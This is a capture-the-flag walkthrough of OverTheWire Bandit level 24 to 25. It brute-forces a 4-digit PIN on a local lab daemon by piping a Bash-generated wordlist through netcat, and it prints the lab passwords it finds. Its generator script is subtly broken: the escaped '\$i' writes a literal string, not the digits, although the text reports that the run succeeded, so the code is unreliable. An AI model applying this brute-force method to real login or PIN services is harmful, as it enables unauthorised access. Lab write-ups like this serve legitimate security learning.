# OverTheWire Bandit Write-Up: Level 24 → Level 25

## Objective
Retrieve the password for `bandit25` by connecting to a local pincode-checker daemon on `localhost` port `30002` and brute-forcing all 10,000 possible 4-digit PIN combinations (`0000–9999`) paired with the `bandit24` password.

---

## How I Solved It

### 1. Tested the Service Behavior on `localhost:30002`
First, I connected manually to port `30002` using Netcat (`nc`) to see the exact prompt and expected input format:

```bash
nc localhost 30002
```
*Output:* `I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.`

Because the daemon stays open across multiple failed attempts (`Wrong! Please enter the correct current password and pincode. Try again.`), I could stream a pre-generated wordlist directly into a single TCP session.

### 2. Verified Batch Streaming with a Small Test List
I created a working directory `/tmp/brute` and tested piping a small sample file (`listit.txt`) into `nc localhost 30002` to confirm the daemon accepted continuous line-by-line guesses:

```bash
mkdir /tmp/brute
cd /tmp/brute
cat listit.txt | nc localhost 30002
```

### 3. Wrote a Bash Script to Generate All 10,000 Combinations
After cleaning up the test file, I wrote a Bash script (`brutef.sh`) using brace expansion (`{0..9}{0..9}{0..9}{0..9}`) to generate every combination from `0000` to `9999` paired with the `bandit24` password into `list.txt`:

```bash
nano brutef.sh
```
```bash
#!/bin/bash

for i in {0..9}{0..9}{0..9}{0..9}
do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 \$i" >> list.txt
done
```
*(Note: In my session, I used the active `bandit24` password from my environment to populate `list.txt` from `0000` through `9999`.)*

I made the script executable and ran it to build `list.txt`:

```bash
chmod +x brutef.sh
./brutef.sh
```

### 4. Streamed the Wordlist to Port `30002`
Finally, I piped the full 10,000-line `list.txt` file into `nc localhost 30002`:

```bash
cat list.txt | nc localhost 30002
```

After processing the attempts, the daemon matched the valid 4-digit PIN, printed `Correct!`, and returned the password for `bandit25`.

---

## Flag / Password Found
* **Bandit25 Password:** `SoH1gMOEqIX2IYKvcIzxvgoR9a2Djx4P` *(verify exact character casing directly from your terminal)*

## What I Learned
* How to use **Bash brace expansion (`{0..9}{0..9}{0..9}{0..9}`)** to quickly generate zero-padded 4-digit numeric wordlists (`0000`–`9999`).
* How piping an entire wordlist over a **single persistent Netcat connection (`cat list.txt | nc localhost 30002`)** avoids connection overhead and solves rate-unlimited PIN checks in seconds.

